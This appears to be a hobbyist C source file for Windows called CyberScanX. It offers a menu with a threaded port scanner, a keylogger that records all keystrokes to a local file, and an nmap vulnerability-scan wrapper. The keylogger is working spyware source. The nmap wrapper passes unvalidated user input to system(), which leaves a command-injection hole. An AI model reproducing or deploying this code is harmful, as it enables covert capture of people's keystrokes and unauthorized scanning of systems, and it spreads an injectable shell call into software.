#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <process.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#define NUM_THREADS 100

// Function to display the intro
void display_intro() {
    printf("\n");
    printf("====================================\n");
    printf("  C y b e r S c a n X\n");
    printf("====================================\n");
    printf("         - by Maahi\n\n");
    Sleep(2000); // Pause for 2 seconds for better effect
}

typedef struct {
    char *target_ip;
    int port;
} ThreadData;

const char* get_service_name(int port) {
    switch (port) {
        case 20: return "FTP (data)";
        case 21: return "FTP";
        case 22: return "SSH";
        case 23: return "Telnet";
        case 25: return "SMTP";
        case 53: return "DNS";
        case 80: return "HTTP";
        case 110: return "POP3";
        case 143: return "IMAP";
        case 443: return "HTTPS";
        case 445: return "SMB";
        case 3306: return "MySQL";
        case 5432: return "PostgreSQL";
        case 5900: return "VNC";
        default: return "Unknown";
    }
}

void scan_port(ThreadData *data) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;

    WSAStartup(MAKEWORD(2, 2), &wsa);
    sock = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_family = AF_INET;
    server.sin_port = htons(data->port);
    server.sin_addr.s_addr = inet_addr(data->target_ip);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
        printf("Port %d (%s) is open.\n", data->port, get_service_name(data->port));
    }
    closesocket(sock);
    WSACleanup();
}

unsigned int __stdcall thread_func(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    scan_port(data);
    free(data);
    return 0;
}

void port_scanner() {
    char target_ip[100];
    printf("Enter target IP: ");
    scanf("%s", target_ip);

    HANDLE threads[NUM_THREADS];
    ThreadData *data[NUM_THREADS];

    for (int i = 0; i < NUM_THREADS; i++) {
        data[i] = (ThreadData *)malloc(sizeof(ThreadData));
        data[i]->target_ip = strdup(target_ip);
        data[i]->port = i + 1;
        threads[i] = (HANDLE)_beginthreadex(NULL, 0, thread_func, data[i], 0, NULL);
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        WaitForSingleObject(threads[i], INFINITE);
        CloseHandle(threads[i]);
    }
}

void keylogger() {
    FILE *log = fopen("keylog.txt", "a");
    if (!log) {
        printf("Error opening log file.\n");
        return;
    }
    
    printf("Keylogger started. Press Ctrl+C to stop.\n");
    while (1) {
        for (char c = 8; c <= 255; c++) {
            if (GetAsyncKeyState(c) & 0x0001) {
                fputc(c, log);
                fflush(log);
            }
        }
    }
    fclose(log);
}

void vulnerability_scanner() {
    char target_ip[100];
    printf("Enter target IP: ");
    scanf("%s", target_ip);
    char command[300];
    
    sprintf(command, "nmap -T4 --min-rate=5000 --script=vuln %s", target_ip);
    
    printf("Running fast vulnerability scan...\n");
    system(command);
}

int main() {
    display_intro(); // Call the intro function

    int choice;
    while (1) {
        printf("Select an option:\n");
        printf("1. Port Scanner\n");
        printf("2. Keylogger\n");
        printf("3. Vulnerability Scanner\n");
        printf("4. Exit\n");
        printf("Enter your choice: ");
        scanf("%d", &choice);

        switch (choice) {
            case 1:
                port_scanner();
                break;
            case 2:
                keylogger();
                break;
            case 3:
                vulnerability_scanner();
                break;
            case 4:
                printf("Exiting...\n");
                return 0;
            default:
                printf("Invalid choice. Please try again.\n");
        }
    }
    return 0;
}
